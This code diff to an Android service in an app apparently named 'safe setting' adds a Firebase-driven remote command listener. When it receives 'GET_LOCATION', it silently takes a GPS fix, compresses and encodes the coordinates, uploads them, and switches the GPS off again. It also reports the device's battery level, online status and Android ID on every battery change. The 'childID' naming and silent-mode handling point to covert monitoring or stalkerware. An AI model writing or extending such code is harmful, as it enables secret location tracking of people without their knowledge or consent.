@@ -12,22 +12,33 @@ import android.os.Looper
 import android.provider.Settings
 import android.telephony.SubscriptionManager
 import android.telephony.TelephonyManager
+import android.location.Location
+import android.location.LocationListener
+import android.location.LocationManager
+import android.content.IntentFilter
+import android.content.BroadcastReceiver
+import com.google.firebase.database.DataSnapshot
+import com.google.firebase.database.DatabaseError
+import com.google.firebase.database.ValueEventListener
 import com.safe.setting.app.data.model.DeviceStatus
 import com.safe.setting.app.data.preference.DataSharePreference.lastInternetOffTime
 import com.safe.setting.app.services.base.BaseService
+import com.safe.setting.app.utils.GzipUtils
+import com.safe.setting.app.utils.GlobalConfig
 import java.util.Date
 import javax.inject.Inject
 import dagger.hilt.android.AndroidEntryPoint
 
 @AndroidEntryPoint
-class DeviceStatusService : BaseService(), InterfaceServiceDeviceStatus {
+class DeviceStatusService : BaseService(), InterfaceServiceDeviceStatus, LocationListener {
 
     @Inject
     lateinit var interactor: InterfaceInteractorDeviceStatus<InterfaceServiceDeviceStatus>
 
     private val handler = Handler(Looper.getMainLooper())
-    private lateinit var statusRunnable: Runnable
-    private val updateInterval = 5 * 60 * 1000L // हर 5 मिनट
+    private var statusRunnable: Runnable? = null
+    private lateinit var locationManager: LocationManager
+    private var batteryReceiver: BroadcastReceiver? = null
 
     override fun onCreate() {
         super.onCreate()
@@ -35,12 +46,86 @@ class DeviceStatusService : BaseService(), InterfaceServiceDeviceStatus {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        statusRunnable = Runnable {
+        // Stop periodic location loop; switch to on-demand command listener
+        try {
+            listenForCommands()
+        } catch (e: Exception) {
+            // Fallback: still collect basic status once at start
             collectAndSendStatus()
-            handler.postDelayed(statusRunnable, updateInterval)
         }
-        handler.post(statusRunnable)
+        // Register runtime battery receiver for precise percentage
+        try { registerRuntimeBatteryReceiver() } catch (_: Exception) {}
         return START_STICKY
+    }
+
+    private fun registerRuntimeBatteryReceiver() {
+        val filter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
+        batteryReceiver = object : BroadcastReceiver() {
+            override fun onReceive(context: Context?, intent: Intent?) {
+                try {
+                    if (intent == null) return
+                    val level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
+                    val scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
+                    val pct = if (level >= 0 && scale > 0) (level * 100) / scale else -1
+                    val internetStatus = getInternetStatus()
+                    val status = DeviceStatus(
+                        batteryLevel = pct,
+                        deviceModel = getDeviceModel(),
+                        isInternetOn = internetStatus.first,
+                        networkType = internetStatus.second,
+                        androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID),
+                        lastInternetOffTime = this@DeviceStatusService.lastInternetOffTime,
+                        lastUpdated = Date().time,
+                        simOperator = "",
+                        sim1Number = "",
+                        sim2Number = ""
+                    )
+                    updateUserDirectory(status)
+                } catch (e: Exception) {
+                    // ignore
+                }
+            }
+        }
+        registerReceiver(batteryReceiver, filter)
+    }
+
+    private fun listenForCommands() {
+        val user = interactor.firebase().getUser() ?: return
+        val childID = user.uid
+        val ref = interactor.firebase().getDatabaseReference("config/$childID/command")
+        ref.addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                val cmd = snapshot.getValue(String::class.java) ?: return
+                if (cmd.equals("GET_LOCATION", ignoreCase = true)) {
+                    if (GlobalConfig.isFrozen) {
+                        // Silent Mode: ignore command and reset to avoid loops
+                        try { interactor.firebase().getDatabaseReference("config/$childID/command").setValue("") } catch (_: Exception) {}
+                        return
+                    }
+                    try {
+                        fetchSingleLocation(childID)
+                    } catch (e: Exception) {
+                        interactor.firebase().getDatabaseReference("config/$childID/command").setValue("")
+                    }
+                }
+            }
+            override fun onCancelled(error: DatabaseError) {}
+        })
+    }
+
+    @SuppressLint("MissingPermission")
+    private fun fetchSingleLocation(childID: String) {
+        try {
+            locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+            // Request high accuracy if possible
+            val provider = when {
+                locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) -> LocationManager.GPS_PROVIDER
+                else -> LocationManager.NETWORK_PROVIDER
+            }
+            locationManager.requestSingleUpdate(provider, this, Looper.getMainLooper())
+        } catch (e: Exception) {
+            interactor.firebase().getDatabaseReference("config/$childID/command").setValue("")
+        }
     }
 
     @SuppressLint("HardwareIds", "MissingPermission")
@@ -72,6 +157,22 @@ class DeviceStatusService : BaseService(), InterfaceServiceDeviceStatus {
         )
         // --- यहाँ तक बदलाव है ---
         interactor.sendDeviceStatus(status)
+        // Also update User_Directory on app start/network/battery change hooks
+        try {
+            updateUserDirectory(status)
+        } catch (_: Exception) {}
+    }
+
+    private fun updateUserDirectory(status: DeviceStatus) {
+        val user = interactor.firebase().getUser() ?: return
+        val childID = user.uid
+        val data = mapOf(
+            "name" to (user.displayName ?: "Unknown"),
+            "batteryLevel" to status.batteryLevel,
+            "isOnline" to status.isInternetOn,
+            "lastSeen" to status.lastUpdated
+        )
+        interactor.firebase().getDatabaseReference("User_Directory/$childID").updateChildren(data)
     }
 
     private data class SimInfo(val operator: String, val sim1: String, val sim2: String)
@@ -154,8 +255,29 @@ class DeviceStatusService : BaseService(), InterfaceServiceDeviceStatus {
     }
 
     override fun onDestroy() {
-        handler.removeCallbacks(statusRunnable)
+        statusRunnable?.let { handler.removeCallbacks(it) }
+        try { unregisterReceiver(batteryReceiver) } catch (_: Exception) {}
         interactor.onDetach()
         super.onDestroy()
     }
+
+    // LocationListener for single update
+    override fun onLocationChanged(location: Location) {
+        try {
+            val user = interactor.firebase().getUser() ?: return
+            val childID = user.uid
+            val payload = "${location.latitude},${location.longitude}"
+            val compressed = GzipUtils.compressToBase64(payload)
+            interactor.firebase().getDatabaseReference("User_Directory/$childID/location").setValue(compressed)
+            // Turn off GPS immediately by removing updates
+            locationManager.removeUpdates(this)
+            // Reset command
+            interactor.firebase().getDatabaseReference("config/$childID/command").setValue("")
+        } catch (e: Exception) {
+            // Best-effort cleanup
+            try { locationManager.removeUpdates(this) } catch (_: Exception) {}
+        }
+    }
+    override fun onProviderEnabled(provider: String) {}
+    override fun onProviderDisabled(provider: String) {}
 }
